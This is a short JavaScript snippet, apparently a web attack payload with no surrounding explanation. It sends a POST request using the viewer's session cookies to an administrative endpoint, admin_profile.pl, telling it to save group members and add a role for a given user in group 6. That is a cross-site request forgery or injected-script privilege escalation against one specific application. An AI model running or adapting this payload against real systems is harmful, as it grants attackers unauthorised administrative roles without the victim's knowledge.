(() => {
  const token = Date.now();
  const data = 'pid=oslo_test&unique=' + token +
    '&action=save_members&group_id=6' +
    '&added_permissions=%7B%7D' +
    '&removed_permissions=%7B%7D' +
    '&added_roles=' + encodeURIComponent('{"1001":{"93940":1}}') +
    '&removed_roles=%7B%7D&su=';

  fetch('/cgi-bin/admin/person/admin_profile.pl', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'X-Requested-With': 'XMLHttpRequest'
    },
    body: data
  });
})();
